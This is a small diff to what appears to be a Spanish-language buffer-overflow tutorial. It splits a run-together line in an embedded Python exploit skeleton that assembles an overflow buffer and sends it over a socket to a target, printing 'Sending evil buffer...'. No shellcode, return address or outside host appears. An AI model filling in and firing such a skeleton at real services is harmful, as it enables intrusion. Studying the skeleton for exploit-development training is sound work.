@@ -127,7 +127,8 @@ Ya con la cantidad de bytes generados (en mi caso 2400) los copiamos y vamos a c
 		retn = ""  
 		padding = ""  
 		payload = ""  
-		postfix = ""buffer = prefix + overflow + retn + padding + payload + postfixs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		postfix = ""
+		buffer = prefix + overflow + retn + padding + payload + postfixs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		try:  
 		  s.connect((ip, port))  
 		  print("Sending evil buffer...")  
